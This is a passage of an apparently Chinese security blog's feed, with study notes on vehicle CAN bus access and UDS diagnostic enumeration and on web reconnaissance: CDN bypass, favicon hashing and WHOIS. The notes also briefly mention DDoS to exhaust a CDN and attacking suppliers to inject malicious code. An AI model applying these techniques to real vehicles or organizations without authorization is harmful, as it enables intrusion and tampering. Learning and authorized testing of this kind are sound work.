    <category term="渗透测试基础" scheme="https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="内网" scheme="https://j3f5.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>车联网基础-SocketCAN与车辆通信</title>
    <link href="https://j3f5.github.io/articles/2023/06/20/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80-SocketCAN%E4%B8%8E%E8%BD%A6%E8%BE%86%E9%80%9A%E4%BF%A1/"/>
    <id>https://j3f5.github.io/articles/2023/06/20/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80-SocketCAN%E4%B8%8E%E8%BD%A6%E8%BE%86%E9%80%9A%E4%BF%A1/</id>
    <published>2023-06-20T01:38:06.000Z</published>
    <updated>2023-06-20T01:38:06.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a class="markdownIt-Anchor" href="#概述"></a> 概述</h1><p>CAN通信，在现实测试中需要了解CAN的各个协议，例如ISO-TP，还有CAN的高低比特率是多少，例如高500，低为250-125，等等。在了解这些之后，我们需要了解各个can连接器，这些链接器可以链接测试CAN总线，后面配合CAN-utils就可以对CAN数据进行读取了。</p><h2 id="连接器"><a class="markdownIt-Anchor" href="#连接器"></a> 连接器</h2><h3 id="vector-canlin-interface"><a class="markdownIt-Anchor" href="#vector-canlin-interface"></a> Vector CAN/LIN interface</h3><h2 id="can-utils"><a class="markdownIt-Anchor" href="#can-utils"></a> can-utils</h2><p>打开kali，安装can-utils：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install can-utils</span><br></pre></td></tr></table></figure><h1 id="测试"><a class="markdownIt-Anchor" href="#测试"></a> 测试</h1><h2 id="标准测试"><a class="markdownIt-Anchor" href="#标准测试"></a> 标准测试</h2><ol><li><p>安装完CAN-utils，则需配置芯片组</p><ol><li>安装CAN嗅探器对应的驱动，确保设备兼容</li><li>对适配器进行初始化</li><li>使用<code>dmesg</code>查看初始化信息</li></ol></li><li><p>查看接口是否存在（接口是否被正确加载）：<code>ifconfig can0</code></p><p><img src="/images/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80-SocketCAN%E4%B8%8E%E8%BD%A6%E8%BE%86%E9%80%9A%E4%BF%A1/image-20230620111945142.png" alt="image-20230620111945142" /></p></li><li><p>设置总线速率，要设置的关键参数是<strong>比特率(bitrate)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ip link set can0 type can bitrate 500000</span><br><span class="line">ip link set up can0</span><br></pre></td></tr></table></figure><p>这样就启动can0设备了，然后就可以使用can-utils进行连接接口了。</p></li><li><p>Linux使用<strong>netlink</strong>在内核和用户空间工具间进行通信，可以通过<code>ip link</code>访问netlink。相关命令可以看：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip link set can0 type can help</span><br></pre></td></tr></table></figure><p>注：内置设备复位（数据包丢失/错误时使用）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ip link set canX type can restart-ms 100</span><br><span class="line">ip link set canx type can restart</span><br></pre></td></tr></table></figure></li><li><p>配置串行设备</p><p>要使用USB转串口适配器，必须首先出水啊串口硬件和CAN总线波特率：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">slcand -o -s6 -t hw -S 3000000 /dev/ttyUSB0</span><br><span class="line">ip link set up slcan0</span><br></pre></td></tr></table></figure><p>slcand守护进程提供了将串口通信转译到网络驱动程序slcan0所欲的接口，注意<code>-s</code>选项即为波特率，具体参考：</p><ul><li><a href="https://blog.csdn.net/weifengdq/article/details/128823317">https://blog.csdn.net/weifengdq/article/details/128823317</a></li></ul></li></ol><h2 id="虚拟"><a class="markdownIt-Anchor" href="#虚拟"></a> 虚拟</h2><p>配置一个虚拟CAN网络用于测试：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">modprobe vcan</span><br><span class="line">demsg | grep vcan</span><br><span class="line">ip link add dev vcan0 type vcan</span><br><span class="line">ip link set up vcan0</span><br><span class="line">ifconfig vcan0</span><br></pre></td></tr></table></figure><h2 id="icsim"><a class="markdownIt-Anchor" href="#icsim"></a> ICSim</h2><p>ICSim(Instrument Cluster Simulator)，是由Open Garages推出的工具。它可以产生多个CAN信号，同时会产生许多背景噪声，让我们可以在没有汽车或不改造汽车的情况下即可练习CAN总线的逆向技术。</p><p>GITHUB地址：<a href="https://github.com/zombieCraig/ICSim">https://github.com/zombieCraig/ICSim</a><br />安装参考：<a href="https://www.anquanke.com/post/id/209141">https://www.anquanke.com/post/id/209141</a></p><h1 id="工具与套件"><a class="markdownIt-Anchor" href="#工具与套件"></a> 工具与套件</h1><h2 id="kayak"><a class="markdownIt-Anchor" href="#kayak"></a> Kayak</h2><h1 id="can逆向"><a class="markdownIt-Anchor" href="#can逆向"></a> CAN逆向</h1><p>为了对CAN总线进行逆向，需要先读取CAN包，识别这些包控制什么功能。**然而不需要访问那些CAN官网诊断数据包，因为它的数据不能动。**在学习过程中，获取数据包中包含的信息是理解车辆行为的关键！</p><h2 id="定位can总线"><a class="markdownIt-Anchor" href="#定位can总线"></a> 定位CAN总线</h2><p>参考协议一章，具体在OBD连接器处。参考：</p><img src="/images/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80-SocketCAN%E4%B8%8E%E8%BD%A6%E8%BE%86%E9%80%9A%E4%BF%A1/image-20230620131201206.png" alt="image-20230620131201206" style="zoom: 50%;" /><p>如果没办法连接OBD-II，那么找隐藏的CAN信号：</p><ol><li><p>找双绞线：成对/绞在一起的导线。CAN线路通常是绞在一起的两根导线，例如：</p><p><img src="/images/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80-SocketCAN%E4%B8%8E%E8%BD%A6%E8%BE%86%E9%80%9A%E4%BF%A1/image-20230620131928484.png" alt="image-20230620131928484" /></p><p><img src="/images/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80-SocketCAN%E4%B8%8E%E8%BD%A6%E8%BE%86%E9%80%9A%E4%BF%A1/image-20230620131953355.png" alt="image-20230620131953355" /></p></li><li><p>万用表测电压2.5V，上下波动1V</p></li><li><p>通过双通道示波器，对到线上信号差异做减法，由于差分信号会互相抵消，应该可以看到恒定信号</p></li></ol><p>注意：CAN总线往往是静默的，通常只需要执行很简单的操作就可以唤醒并产生信号。</p><h2 id="使用wireshark与can-utils逆向can总线通信"><a class="markdownIt-Anchor" href="#使用wireshark与can-utils逆向can总线通信"></a> 使用Wireshark与can-utils逆向Can总线通信</h2><h3 id="使用"><a class="markdownIt-Anchor" href="#使用"></a> 使用</h3><p>can-utils一般使用的是candump工具，命令是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">candump -b vcan0 slcan0</span><br></pre></td></tr></table></figure><p>不指定<code>-b</code>，默认也行。</p><p>使用wireshark，点击你想要监听的网卡就行（就是vlan0）</p><h3 id="分组can总线数据流"><a class="markdownIt-Anchor" href="#分组can总线数据流"></a> 分组can总线数据流</h3><p>CAN总线上会有很多噪声</p><h1 id="ecu渗透测试"><a class="markdownIt-Anchor" href="#ecu渗透测试"></a> ECU渗透测试</h1><p>流程为：</p><ol><li>初始化（确定）攻击向量，例如wifi模块</li><li>提取固件，例如使用SmartRF_Flash_Programmer-1.12.8</li><li>攻破SOC系统，里面是一些通信模块（使用PWN方法）</li><li>攻破MCU系统，里面的系统是裸的</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;概述&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#概述&quot;&gt;&lt;/a&gt; 概述&lt;/h1&gt;
&lt;p&gt;CAN通信，在现实测试中需要了解CAN的各个协议，例如ISO-TP，还有CAN的高低比特率是多少，例如高500，低为250-125，等等。在了解</summary>
      
    
    
    
    <category term="车联网基础" scheme="https://j3f5.github.io/categories/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="CAN" scheme="https://j3f5.github.io/tags/CAN/"/>
    
  </entry>
  
  <entry>
    <title>车联网基础-诊断和日志</title>
    <link href="https://j3f5.github.io/articles/2023/06/15/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80-%E8%AF%8A%E6%96%AD%E5%92%8C%E6%97%A5%E5%BF%97/"/>
    <id>https://j3f5.github.io/articles/2023/06/15/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80-%E8%AF%8A%E6%96%AD%E5%92%8C%E6%97%A5%E5%BF%97/</id>
    <published>2023-06-15T05:03:59.000Z</published>
    <updated>2023-06-15T05:03:59.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="诊断服务uds-obd"><a class="markdownIt-Anchor" href="#诊断服务uds-obd"></a> 诊断服务（UDS OBD）</h1><p>先回顾一下一些服务系统</p><ol><li>OBD作为系统，自上而下，标准庞大而清晰。</li><li>UDS作为服务，上层清晰，兼容不同下层，以最终功能实现为要求。</li><li>OBD是关注车辆实时排放的理念形成的行业规范，而UDS是诊断服务的统一化规范。</li><li>UDS是面向整车所有ECU(电控单元)的，而OBD是面向排放系统ECU的。</li></ol><p>再声明一些专有名词：</p><table><thead><tr><th>缩写</th><th>解释</th></tr></thead><tbody><tr><td>DTC</td><td>故障诊断代码</td></tr><tr><td>MIL</td><td>故障指示灯</td></tr><tr><td>PCM</td><td>动力系统控制模块（多个ECU组成）</td></tr><tr><td>RPM</td><td>发动机每分钟转速</td></tr><tr><td>UDS</td><td>统一诊断服务</td></tr><tr><td>EDR</td><td>事件数据记录日志（黑匣子，一般在ECU旁边）</td></tr><tr><td>ACM</td><td>安全气囊控制模块</td></tr><tr><td>SDM</td><td>【通用汽车】感知和诊断模块（存储汽车速度的纵向变化，不记录任何事故后的信息）</td></tr><tr><td>RCM</td><td>【福特】约束控制模块（存储汽车纵向和侧向加速度，与SDR不同）</td></tr><tr><td>ACN</td><td>自动事告呼救系统（将事件告知第三方）</td></tr></tbody></table><h2 id="攻击场景"><a class="markdownIt-Anchor" href="#攻击场景"></a> 攻击场景</h2><p>如果在对车辆总线进行实验时触发了故障，那么需要能够读取并写入PCM以清除故障。则我们需要知道：</p><ol><li>如何读取并清除诊断代码</li><li>查询ECU诊断服务的方法</li><li>如何访问汽车的碰撞数据记录</li><li>如何暴力破解隐藏的诊断代码</li></ol><h1 id="dct故障诊断代码"><a class="markdownIt-Anchor" href="#dct故障诊断代码"></a> DCT（故障诊断代码）</h1><h2 id="概念与知识"><a class="markdownIt-Anchor" href="#概念与知识"></a> 概念与知识</h2><h3 id="格式"><a class="markdownIt-Anchor" href="#格式"></a> 格式</h3><table><thead><tr><th>字节位置</th><th>解释</th></tr></thead><tbody><tr><td>1</td><td>P(0x0)=动力系统，B(0x1)=车身，C(0x2)=底盘，D(0x3)=网络</td></tr><tr><td>2</td><td>0、2、3（SAE标准），1、3（制造商专用码）【注：3可能是anyone】</td></tr><tr><td>3</td><td>字节位置1的子组</td></tr><tr><td>4</td><td>特定的故障区域</td></tr><tr><td>5</td><td>特定的故障区域</td></tr></tbody></table><p>DTC中5个字符仅有网络上的两个原始字节表示。将这两个DTC字节分解成完整的DTC代码方法如下：</p><table><thead><tr><th>格式</th><th>字节1【1】</th><th>-【2】</th><th>-【3】</th><th>字节2【4】</th><th>-【5】</th><th>结果</th></tr></thead><tbody><tr><td>十六进制</td><td>0x0</td><td></td><td>0x4</td><td>0x7</td><td>0x7</td><td>0x0477</td></tr><tr><td>二进制</td><td>00</td><td>00</td><td>0100</td><td>0111</td><td>0111</td><td>第0-15位</td></tr><tr><td>DTC</td><td>P</td><td>0</td><td>4</td><td>7</td><td>7</td><td>P0477</td></tr></tbody></table><p>除了前两个字符外，这些字符都有一一对应的关系（【?】对应上面的字节位置）。这些都是<strong>SAE标准的代码</strong>。</p><h3 id="故障分类"><a class="markdownIt-Anchor" href="#故障分类"></a> 故障分类</h3><ul><li>硬故障：不进行干预就没办法正常消除的故障（例如：清除DTC后，故障仍然出现）</li><li>软故障：间接性问题，例如油箱盖松动之类的问题</li></ul><p>注意：</p><p>并非所有的故障都会点亮MIL灯，它有四类故障</p><ul><li>A类：（总排放失效）亮</li><li>B类：（不影响排放系统）记录数次后亮</li><li>C类：通常不会亮，而是“请尽快保养发动机”</li><li>D类：不亮</li></ul><h3 id="冻结帧数据freeze-frame-data"><a class="markdownIt-Anchor" href="#冻结帧数据freeze-frame-data"></a> 冻结帧数据（Freeze Frame Data）</h3><p>存储DTC时，PCM快照所有相关的发送机部件信息，并存入FFD中。通常包含以下信息：</p><table><thead><tr><th>相关DTC</th><th>发动机负载</th><th>发动机每分钟转速（RPM）</th></tr></thead><tbody><tr><td>发动机温度</td><td>燃油修正</td><td>歧管气压/空气流量（MAP/MAF）值</td></tr><tr><td>操作模式（开/闭电路）</td><td>风门位置</td><td>车速</td></tr></tbody></table><p>理想状态下快照将在DTC出现的时候同时进行，而冻结帧通常在DTC触发后5妙才开始记录。</p><h2 id="读取与清除"><a class="markdownIt-Anchor" href="#读取与清除"></a> 读取与清除</h2><h3 id="读取"><a class="markdownIt-Anchor" href="#读取"></a> 读取</h3><p>使用vehicle spy3不仅能监控和发送报文，还能实现DTC读取和解析，但现在这种功能只适用于采用ISO14229诊断协议的控制器。通过电话与英特佩斯的工程师沟通得知，由于KWP2000协议在美国已经很少使用，所以对采用KWP2000诊断协议的控制器，vehicle spy3仅支持DTC的读取，而不支持DTC的解析。</p><p>工具：</p><ol><li><a href="https://blog.csdn.net/qq_34430371/article/details/114239041">vehicle spy3</a>的使用</li></ol><h3 id="清除"><a class="markdownIt-Anchor" href="#清除"></a> 清除</h3><p>条件：</p><ol><li>PCM三次检查后，不再出现故障，则清除（则硬DTC清除）</li><li>断开电源（则软DTC清除）</li></ol><h1 id="uds统一诊断服务"><a class="markdownIt-Anchor" href="#uds统一诊断服务"></a> UDS——统一诊断服务</h1><p>UDS：向修理人员提供一种统一的展示车辆运行状态的方式（只是展示部分信息），为只读模式。</p><p>使用UDS可以进行：<strong>诊断测试</strong>、<strong>更改固件</strong></p><h2 id="uds安全威胁"><a class="markdownIt-Anchor" href="#uds安全威胁"></a> UDS安全威胁</h2><h2 id="uds刷写"><a class="markdownIt-Anchor" href="#uds刷写"></a> UDS刷写</h2><p>具体参考</p><ul><li><a href="https://www.iotsec-zone.com/article?id=376">参考1</a></li><li><a href="https://www.iotsec-zone.com/article?id=376">参考2</a></li></ul><p><strong>服务ID</strong>：后续UDS刷写中用到的服务ID</p><p><strong>会话定义</strong>：刷写中会话切换，不同阶段在不同的会话。</p><p><strong>27服务认证流程</strong>：刷写解锁，安全访问的基本流程。</p><p><strong>诊断连接方式</strong>：不同的连接方式，直接和通过网关连接。</p><p><strong>固件格式</strong>：刷写中使用到的固件的常见的格式以及简单的分析。</p><h3 id="前置知识"><a class="markdownIt-Anchor" href="#前置知识"></a> 前置知识</h3><h4 id="caringcaribou的安装与使用"><a class="markdownIt-Anchor" href="#caringcaribou的安装与使用"></a> caringcaribou的安装与使用</h4><p>网卡安装：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 在~/.canrc中写入如下内容</span><br><span class="line">[default]</span><br><span class="line">interface = socketcan</span><br><span class="line">channel = vcan0</span><br><span class="line"></span><br><span class="line">关闭网卡</span><br><span class="line">ifconfig can0 down</span><br><span class="line">设置波特率</span><br><span class="line">ip link set can0 type can bitrate 500000</span><br><span class="line">开启网卡</span><br><span class="line">ifconfig can0 up</span><br></pre></td></tr></table></figure><p>使用candump来看看是否安装好</p><p><strong>UDS模块</strong></p><ol><li><p><code>cc.py uds discovery </code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">| CLIENT ID  | SERVER ID  |</span><br><span class="line">+------------+------------+</span><br><span class="line">| 0x00000733 | 0x00000633 |</span><br></pre></td></tr></table></figure></li><li><p><code>cc.py uds services 0x733 0x633</code></p><p>查看服务：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Supported service 0x10: DIAGNOSTIC_SESSION_CONTROL</span><br><span class="line">Supported service 0x11: ECU_RESET</span><br><span class="line">Supported service 0x14: CLEAR_DIAGNOSTIC_INFORMATION</span><br><span class="line">Supported service 0x19: READ_DTC_INFORMATION</span><br><span class="line">Supported service 0x22: READ_DATA_BY_IDENTIFIER</span><br><span class="line">Supported service 0x23: READ_MEMORY_BY_ADDRESS</span><br><span class="line">Supported service 0x2a: READ_DATA_BY_PERIODIC_IDENTIFIER</span><br></pre></td></tr></table></figure></li><li><p><code>cc.py uds ecu_reset 1 0x733 0x633</code>，这里，ECU刷写有硬件复位和软件复位等等。在1那设置。</p></li></ol><h3 id="流程"><a class="markdownIt-Anchor" href="#流程"></a> 流程</h3><ol><li><p>发现会话</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">─# cc.py uds discovery                     </span><br><span class="line">+------------+------------+</span><br><span class="line">| CLIENT ID  | SERVER ID  |</span><br><span class="line">+------------+------------+</span><br><span class="line">| 0x00000733 | 0x00000633 |</span><br><span class="line">| 0x000007df | 0x000007f9 |</span><br><span class="line">| 0x000007f1 | 0x000007f9 |</span><br><span class="line">| 0x000007ff | 0x00000633 |</span><br><span class="line">+------------+------------+</span><br></pre></td></tr></table></figure></li><li><p>选择会话看服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">└─# cc.py uds services 0x733 0x633</span><br><span class="line"></span><br><span class="line">Supported service 0x10: DIAGNOSTIC_SESSION_CONTROL</span><br><span class="line">Supported service 0x11: ECU_RESET</span><br><span class="line">Supported service 0x14: CLEAR_DIAGNOSTIC_INFORMATION</span><br><span class="line">Supported service 0x19: READ_DTC_INFORMATION</span><br><span class="line">Supported service 0x22: READ_DATA_BY_IDENTIFIER</span><br><span class="line">Supported service 0x23: READ_MEMORY_BY_ADDRESS</span><br><span class="line">Supported service 0x2a: READ_DATA_BY_PERIODIC_IDENTIFIER</span><br><span class="line">Supported service 0x2c: DYNAMICALLY_DEFINE_DATA_IDENTIFIER</span><br><span class="line">Supported service 0x2f: INPUT_OUTPUT_CONTROL_BY_IDENTIFIER</span><br><span class="line">Supported service 0x31: ROUTINE_CONTROL</span><br><span class="line">Supported service 0x3e: TESTER_PRESENT</span><br><span class="line">Supported service 0xaf: Unknown service</span><br></pre></td></tr></table></figure></li><li><p>对照看到他</p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;诊断服务uds-obd&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#诊断服务uds-obd&quot;&gt;&lt;/a&gt; 诊断服务（UDS OBD）&lt;/h1&gt;
&lt;p&gt;先回顾一下一些服务系统&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;OBD作为系统，自上而下，标准庞大而</summary>
      
    
    
    
    <category term="车联网基础" scheme="https://j3f5.github.io/categories/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="诊断" scheme="https://j3f5.github.io/tags/%E8%AF%8A%E6%96%AD/"/>
    
  </entry>
  
  <entry>
    <title>信息搜集</title>
    <link href="https://j3f5.github.io/articles/2023/06/14/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
    <id>https://j3f5.github.io/articles/2023/06/14/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</id>
    <published>2023-06-14T07:00:58.000Z</published>
    <updated>2023-06-14T07:00:58.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a class="markdownIt-Anchor" href="#概述"></a> 概述</h1><p>在信息收集阶段，我们需要尽量多的收集关于目标web应用的各种信息，比如：脚本语言的类型、服务器的类型、目录的结构、使用的开源软件、数据库类型、所有链接页面，用到的框架等。</p><p>所以我们首先从几个部分对目标信息进行搜集：</p><ol><li>寻找真实的IP，判断是否存在CDN。如果存在CDN，那么我们打的都是网站的缓存，没办法接触到真实的主机</li><li>寻找旁站，子域名，资产信息，人员信息。扩大攻击面和资料库</li><li>对网站信息进行搜集，例如脚本语言，开源软件，软件架构CMS等等，还可以看看是否存在waf，是什么waf</li><li>拓展网站是否存在APP、微信小程序</li></ol><p><img src="/images/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86.png" alt="信息搜集" /></p><p><img src="/images/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/water.png" alt="water" /></p><h1 id="寻找真实ip"><a class="markdownIt-Anchor" href="#寻找真实ip"></a> 寻找真实IP</h1><h2 id="cdn"><a class="markdownIt-Anchor" href="#cdn"></a> CDN</h2><p>为了加速各个区域对于网站的响应，于是在各个节点布置一个网站的缓存，使得各个区域访问这个网站在时间上不会出现太多延迟。</p><h2 id="判断cdn"><a class="markdownIt-Anchor" href="#判断cdn"></a> 判断CDN</h2><h3 id="超级ping国内多地同时pinghttpswwwpingcn"><a class="markdownIt-Anchor" href="#超级ping国内多地同时pinghttpswwwpingcn"></a> 超级ping（国内多地同时Ping）：<a href="https://www.ping.cn/">https://www.ping.cn/</a></h3><p>如果出现多IP地址，那么就是存在CDN</p><p><img src="/images/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/image-20230707145753239.png" alt="image-20230707145753239" /></p><h3 id="观察请求响应的返回数据的头部"><a class="markdownIt-Anchor" href="#观察请求响应的返回数据的头部"></a> 观察请求响应的返回数据的头部</h3><p>观察是否有 CDN 服务商标识，一般在X-Cache，观察有没有Hit的字样。</p><img src="/images/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/image-20230707150803348.png" alt="image-20230707150803348" style="zoom:50%;" /><h3 id="通过nslookup"><a class="markdownIt-Anchor" href="#通过nslookup"></a> 通过nslookup</h3><img src="/images/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/image-20230707151038051.png" alt="image-20230707151038051" style="zoom:50%;" /><h2 id="绕过cdn"><a class="markdownIt-Anchor" href="#绕过cdn"></a> 绕过CDN</h2><p><img src="/images/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/cdn.png" alt="cdn.png" /></p><h3 id="通过子域名查询"><a class="markdownIt-Anchor" href="#通过子域名查询"></a> 通过子域名查询</h3><p>申请CDN需要钱，并非所有子域名都会配置CDN，所以~</p><h3 id="查询历史dns"><a class="markdownIt-Anchor" href="#查询历史dns"></a> 查询历史DNS</h3><p>站点在使用CDN服务之前，它的真实IP地址可能被DNS服务器所记录到，此时我们就可以通过DNS历史记录找到目标真实IP。以量打量，就是常说的ddos攻击或者说是流量耗尽攻击，在网上开CDN的时候，都会分地区流量，就比如这个节点有1G流量，当这流量用完后，用户再访问就会访问网站真实的ip地址。</p><p>DNSDB：<a href="https://www.dnsdb.io/zh-cn/">https://www.dnsdb.io/zh-cn/</a></p><h3 id="通过邮件返回的地址解析"><a class="markdownIt-Anchor" href="#通过邮件返回的地址解析"></a> 通过邮件返回的地址解析</h3><p>很多公司内部都会有一个邮箱服务器，这种邮箱服务器大部分是不会做CDN的。因为邮箱服务器一般都是公司内部人去访问，所以不做CDN。因此，我们就可以根据对方邮件服务器给我们发送的邮件，来判断对方的IP地址。</p><img src="/images/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/image-20230707151937630.png" alt="image-20230707151937630" style="zoom:33%;" /><img src="/images/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/image-20230707151442232.png" alt="image-20230707151442232" style="zoom:33%;" /><h3 id="国外访问"><a class="markdownIt-Anchor" href="#国外访问"></a> 国外访问</h3><p>有些网站为了节省成本，不会把CDN部署在国外，或者只在客户群体比较多的一些国家进行部署，客户群体少的就没有，不值得搭建CDN，因此这样从国外访问国内的网站就很可能直接访问的就是主站的真实ip地址。（尽量找比较偏僻的国家，或者说就是客户群体很少的国家，进行访问）</p><p><a href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a></p><h3 id="黑暗引擎搜索特定文件"><a class="markdownIt-Anchor" href="#黑暗引擎搜索特定文件"></a> 黑暗引擎搜索特定文件</h3><p>google，shodan，zoomeye，fofa等</p><p>这里的特定文件，指的是站点的icon文件，也就是网站的图标，一般查看网页源代码可以找到，格式大致<code>http://www.xx.com/favicon.ico</code>。在shodan搜索网站icon图标的语法为：http.favicon.hash:hash值，hash是一个未知的随机数，我们可以通过shodan语法来查看一个已经被shodan收录的网站的hash值，来进一步获取到所有带有某icon的网站。</p><p>shodan的语法：<code>http.favicon.hash:hash</code>值。工具：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Python2 执行环境</span></span><br><span class="line"><span class="comment">#安装 mmh3 失败记得先安装下这个Microsoft Visual C++ 14.0</span></span><br><span class="line"><span class="keyword">import</span> mmh3</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">response = requests.get(<span class="string">&#x27;http://www.xx.com/favicon.ico&#x27;</span>)</span><br><span class="line">favicon = response.content.encode(<span class="string">&#x27;base64&#x27;</span>)</span><br><span class="line"><span class="built_in">hash</span> = mmh3.<span class="built_in">hash</span>(favicon)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;http.favicon.hash:&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">hash</span>)</span><br></pre></td></tr></table></figure><p>实际上就是收录库的比对</p><h1 id="资产信息"><a class="markdownIt-Anchor" href="#资产信息"></a> 资产信息</h1><p>包括很多，在安全测试中，若 WEB 无法取得进展或无 WEB 的情况下，我们需要借助 APP 或其他资产在进行信息收集，从而开展后续渗透，那么其中的信息收集就尤为重要</p><h2 id="企业信息"><a class="markdownIt-Anchor" href="#企业信息"></a> 企业信息</h2><p>主要可以分为：WHOIS信息查询+IPC信息+股权信息+子公司信息</p><p>主要目的：扩大攻击范围，寻找更多的业务，更多的供应商链，人员信息搜集（敏感信息，可以用来制作字典）</p><h3 id="whois"><a class="markdownIt-Anchor" href="#whois"></a> WHOIS</h3><p>很多网站上都可以收集到whois信息，比如说：</p><blockquote><p><a href="http://xn--who-ok6ez9gts1e.is">国外的who.is</a>：<a href="https://who.is/">https://who.is/</a></p><p>站长之家：<a href="http://whois.chinaz.com/">http://whois.chinaz.com/</a></p><p>爱站：<a href="https://whois.aizhan.com/">https://whois.aizhan.com/</a></p><p>微步：<a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></p></blockquote><p>这些网站都可以收集whois信息，而且还很全面，</p><p>主要关注：<strong>注册商、注册人、邮件、DNS解析服务器、注册人联系电话</strong></p><p>小技巧：如果在站长之家上隐藏了信息，可在who.is上再次查看。</p><h3 id="企业备案与股份信息"><a class="markdownIt-Anchor" href="#企业备案与股份信息"></a> 企业备案与股份信息</h3><p>有需要的还可以查企业的备案信息，主要有三种方式：</p><blockquote><p>天眼查：<a href="https://www.tianyancha.com/">https://www.tianyancha.com/</a></p><p>ICP备案查询网：<a href="http://www.beianbeian.com/">http://www.beianbeian.com/</a></p><p>国家企业信用信息公示系统：<a href="http://www.gsxt.gov.cn/index.html">http://www.gsxt.gov.cn/index.html</a></p><p>企查查：<a href="https://www.qcc.com/">https://www.qcc.com/</a></p></blockquote><p>注意：国外的服务器一般来说是查不到的，因为他们不需要备案。国内的基本上都可以查到。</p><p>主要关注：股权信息，子公司孙公司（投资超过50%/行政权）</p><h3 id="供应商"><a class="markdownIt-Anchor" href="#供应商"></a> 供应商</h3><p>供应商提供的软件一般是收到该商家信任的，所以可以攻击供应商，以此为跳板注入恶意代码攻击此商家。还可以获取供应商上的其他信息。</p><blockquote><p>网页底部的备案信息</p><p>招标文件</p></blockquote><h3 id="工具"><a class="markdownIt-Anchor" href="#工具"></a> 工具</h3><p><a 